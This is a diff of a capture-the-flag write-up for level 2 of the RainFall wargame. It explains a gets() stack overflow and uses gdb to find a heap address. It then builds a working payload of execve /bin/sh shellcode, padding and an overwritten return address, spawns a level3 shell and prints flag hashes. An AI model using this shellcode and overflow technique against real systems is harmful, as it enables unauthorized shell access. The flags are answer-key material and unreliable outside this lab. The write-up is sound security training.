@@ -1,14 +1,3 @@
--> gets() don't check the length of the input then we can overwrite datas in the stack
--> Verify that ret addr (ebp + 4) is not an stack address (0xbf....)
--> Then we need to keep it intact
--> Keep it intact and overwrite main ret addr
-
-return p() address: 0x0804854a
-return main address: 0xb7e454d3
-
-(python -c 'print "A"*76 + "\x68\xfc\xff\xbf\x4a\x85\x04\x08\x50\x85\x04\x08" + "A"*8 + "\xa0\xfc\xff\xbf" + "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"';cat) | ./level2
-
-
 # Level 2
 
 ## General Informations 
@@ -51,20 +40,19 @@ void main(void)
 }
 ```
 
-We have 2 functions. </br>
-The `main` that executes the `p` function. </br>
-The `p` function, which save the user input inside a buffer and verify that the return address of the function isn't a **stack address** (`0xb0000000 - 0xbfffffff`). </br>
-If it is then we enter the exit condition else the buffer is stored in the heap by `strdup`. 
-</br> 
+We have two functions. </br>
+The main function simply calls the `p` function. </br>
+The `p` function stores `user input` in a buffer and checks whether the `return address` of the function is a `stack address` (i.e., within the range `0xb0000000 - 0xbfffffff`). </br>
+If it is, the program triggers an exit condition. Otherwise, the buffer is duplicated and stored in the heap using strdup. </br>
 
 ## Vulnerability found 
 
-The `gets` function write the user input from stdin inside the buffer. `gets` doesn't verify the length of the user input (buffer overrun), which make it a vulnerable function. <br/>
-We can write more bytes in memory than the buffer can save, we can corrupt the memory.
+The `gets` function writes user input from stdin into a buffer. However, gets does not check the length of the input (buffer overrun), which makes it a vulnerable function. <br/>
+This allows us to write more bytes into memory than the buffer can hold, potentially leading to memory corruption.
 
 ## Dynamic Analysis
 
-Firstly we write a shellcode inside the buffer
+First, we write a shellcode followed by `A` characters to fill the buffer. We keep the null-terminating character `\x00` at the end of the string to avoid interfering with subsequent function calls.
 ```
 (gdb) r <<< $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * (75 - 28)')
 (gdb) x/32x $esp 
@@ -78,42 +66,99 @@ Firstly we write a shellcode inside the buffer
 0xbffff720:	0x08048550	0x00000000	0x00000000	0xb7e454d3
 ```
 
-We need to find a way to overwrite the address `0x0804854a` `($ebp + 4)` by the address of our buffer. 
+We need to find a way to overwrite the address `0x0804854a` `($ebp + 4)` with the address of our buffer.
 
-When looking to the rest of the instruction we see that our buffer is copied to the heap wich have a different address.
+By analyzing the instructions, we notice that our buffer is copied into the heap using the `strdup` function. Heap and stack addresses have different prefixes, which gives us a useful hint.
 
+Heap addresses are only mapped after the first call to `malloc` or similar memory allocation functions. Therefore, we set a breakpoint right after the call to strdup and continue the execution.
+
+```
+(gdb) b *0x0804853d
+Breakpoint 3 at 0x804853d
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/level2/level2 
+wdf
+wdf
+
+Breakpoint 3, 0x0804853d in p ()
+```
+
+When the breakpoint is hit we can display the addresses mapped with the command `info proc mappings`
+
+```
+(gdb) info proc mappings
+process 2612
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
+	 0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
+	 0x804a000  0x806b000    0x21000        0x0 [heap]
+	0xb7e2b000 0xb7e2c000     0x1000        0x0 
+	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd2000 0xb7fd5000     0x3000        0x0 
+	0xb7fd9000 0xb7fdd000     0x4000        0x0 
+	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+```
+
+Looks good! The heap addresses are located in a different region from the stack addresses, they start with the value `0x804`.
+
+To obtain the exact address of our buffer in the heap, we will examine the registers immediately after the `strdup` call.
+```
+(gdb) i r
+eax            0x804a008	134520840
+```
+
+Now let's try to overwrite the return value (ebp + 4) with this value. 
+```
+(gdb) r <<< $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * (76 - 28) + "_ebp" + "\x08\xa0\x04\x08"')
+Starting program: /home/user/level2/level2 <<< $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * (76 - 28) + "_ebp" + "\x08\xa0\x04\x08"')
+1�Ph//shh/bin����°
+                  1�@̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000804a0 in ?? ()
+```
+
+The line `1�Ph//shh/bin����°` indicates that the program `/sh/bin` is executed. </br>
 
 
 ## Payload construction 
 
-In the static analysis we found that the `run` function executes a shell.
+Our payload is divided in 3 groups:
 
-We can overwrite the `return address of main` by the address of the `run` function. 
-```
-info functions
-...
-0x08048444  run
+- The first one is our shellcode and characters to fill  our buffer, 76 chars in total : </br> `"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * (76 - 28)`
 
-payload: (python -c 'print "A" * 76 + "\x44\x84\x04\x08"')
-```
+- The second string is  the number of characters to access the return address (ebp + 4): </br>
+`"_ebp"`
 
-We redirect the stream to the program with a pipe and we add the command `cat` to keep the shell alive.
-```
-(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
-```
+- The last one is the new malicious address : </br>
+`"\x08\xa0\x04\x08"`
 
+```
+python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * (75 - 28) + "_ebp" + "\x08\xa0\x04\x08"'
+```
 
 ## Demonstration 
 
 ```
-level1@RainFall:~$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
-Good... Wait what?
+level2@RainFall:~$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * (76 - 28) + "B" * 4 + "\x08\xa0\x04\x08"'; cat) | ./level2 
+1�Ph//shh/bin����°
+                  1�@̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBB�
 whoami
-level2
+level3
 ```
 
 ## Flag 
 
 ```
-53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
